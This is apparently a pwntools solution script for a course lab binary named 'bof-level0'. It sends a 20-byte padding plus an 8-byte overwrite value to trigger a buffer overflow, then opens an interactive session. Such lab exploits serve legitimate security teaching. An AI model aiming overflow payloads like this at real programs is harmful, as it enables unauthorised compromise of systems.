#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level0/bof-level0')

buffer = "A"*20 + "ABCDEFGH"


p.sendline(buffer)
p.interactive()
